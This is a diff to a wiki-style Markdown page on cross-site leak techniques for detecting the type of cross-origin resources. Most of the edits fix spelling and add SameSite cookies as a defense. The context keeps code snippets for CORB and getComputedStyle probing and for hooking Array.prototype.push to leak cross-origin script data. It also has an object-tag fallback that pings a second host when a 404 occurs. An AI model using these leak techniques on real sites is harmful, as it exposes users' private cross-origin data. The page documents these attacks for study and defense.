@@ -6,6 +6,7 @@ abuse = [
     "HTMLElement",
 ]
 defenses = [
+    "SameSite Cookies"
 ]
 menu = "main"
 weight = 2
@@ -41,9 +42,9 @@ async function getType(url) {
 ```
 
 ## Abusing CORB
-[CORB]({{< ref "/docs/attacks/browser-features/corb.md" >}}) is a feature of Chrome that makes reposnses empty if the wrong content type is used.
-This means that if the type is wrong its not cached.
-A ifCached function can be found at [Cache Probing]({{< ref "/docs/attacks/cache-probing.md" >}})
+[CORB]({{< ref "/docs/attacks/browser-features/corb.md" >}}) is a feature of Chrome that makes responses empty if the wrong content type is used.
+This means that if the type is wrong it’s not cached.
+An ifCached function can be found at [Cache Probing]({{< ref "/docs/attacks/cache-probing.md" >}})
 ```javascript
 async function isType(url, type = "script") {
   let error = false;
@@ -66,7 +67,7 @@ async function isType(url, type = "script") {
 
 ## Abusing getComputedStyle
 [getComputedStyle](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle) can be used to leak CSS style sheets.  
-This function just checks if there has been a style appled to the body.
+This function just checks if there has been a style applied to the body.
 ```javascript
 async function isCSS(url) {
     let link = document.createElement('link');
@@ -93,12 +94,12 @@ async function isPDF(url) {
     return result;
 }
 ```
-{{< hint warning  >}} There will be false positives if the page has other embeds.{{< /hint >}}
+{{< hint warning  >}} There will be false positives if the page has other embeds. {{< /hint >}}
 
 ## Script tag
 Leaks the contents of a cross origin script during execution.  
 The contents of a function can be leaked using `.toString()` and variables may also be assigned to the `window`.  
-Even if the data is not acessible from the window its still possible to hook a function that it uses.  
+Even if the data is not accessible from the window it’s still possible to hook a function that it uses.  
 ```javascript
 let hook = window.Array.prototype.push;
 window.Array.prototype.push = function() {
@@ -108,9 +109,9 @@ window.Array.prototype.push = function() {
 ```
 {{< hint tip >}} A paper was made using this attack [link](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf) {{< /hint >}}
 
-## When Javascript cant be used
-If the `error` event cant be used [fallback content](https://html.spec.whatwg.org/multipage/dom.html#fallback-content) might be an alternative.  
-This sends a request to [example.org](https://example.org) when theirs a 404 on [example.com](https://example.com).
+## When Javascript can’t be used
+If the `error` event can’t be used [fallback content](https://html.spec.whatwg.org/multipage/dom.html#fallback-content) might be an alternative.  
+This sends a request to [example.org](https://example.org) when there's a 404 on [example.com](https://example.com).
 ```html
 <object data="https://example.com/404">
 <object data="https://example.org/?event=error"></object>
